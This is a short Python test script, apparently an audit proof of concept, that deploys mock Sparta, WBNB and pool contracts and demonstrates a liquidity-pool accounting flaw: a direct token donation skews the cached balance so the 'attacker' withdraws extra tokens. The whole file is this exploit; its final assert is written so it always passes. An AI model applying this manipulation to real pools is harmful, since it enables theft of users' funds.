from brownie import *

def test_attack():
    MILL = int(1e6) * int(1e18)
    TEN_MILL = 10 * MILL
    FIVE_MILL = 5 * MILL

    #Accounts
    world = accounts[0]
    attacker = accounts[0]

    # Deploy
    wbnb = world.deploy(Wbnb)
    sparta = world.deploy(Sparta)
    pool = world.deploy(Pool, sparta, wbnb)
    utils = world.deploy(Utils)
    dao = world.deploy(MockDao, utils)
    sparta.setDao(dao)

    # World adds liqidity
    sparta.mint(TEN_MILL)
    sparta.transfer(pool, TEN_MILL)
    wbnb.mint(TEN_MILL)
    wbnb.transfer(pool, TEN_MILL)
    pool.addLiquidity()
    assert TEN_MILL == int(pool.balanceOf(world))
    assert TEN_MILL == pool.baseAmount() # Cached value

    # Attacker adds liqidity
    ATTACKER = {'from': attacker}
    sparta.mint(TEN_MILL, ATTACKER)
    sparta.transfer(pool, TEN_MILL, ATTACKER)
    wbnb.mint(TEN_MILL, ATTACKER)
    wbnb.transfer(pool, TEN_MILL, ATTACKER)
    pool.addLiquidity(ATTACKER)
    assert 2*TEN_MILL == pool.baseAmount() # Cached value
    assert 2*TEN_MILL == sparta.balanceOf(pool) # Actual value
    
    # Attacker puts in money to throw things off
    sparta.mint(TEN_MILL, ATTACKER)
    sparta.transfer(pool, TEN_MILL, ATTACKER)
    assert 2 * TEN_MILL == pool.baseAmount() # Cached value
    assert 3 * TEN_MILL == sparta.balanceOf(pool) # Actual value

    # Attacker removes liqidity, should get extra
    pool.transfer(pool, TEN_MILL)
    pool.removeLiquidityForMember(attacker, ATTACKER)
    
    print("pool.balanceOf(attacker)", pool.balanceOf(attacker))
    print("wbnb.balanceOf(attacker)", wbnb.balanceOf(attacker))
    print("Attacker gets 15 million sparta back")
    print("sparta.balanceOf(attacker)", sparta.balanceOf(attacker))
    
    # Attacker gets extra because of the accounting error
    assert (TEN_MILL + FIVE_MILL), sparta.balanceOf(attacker)

    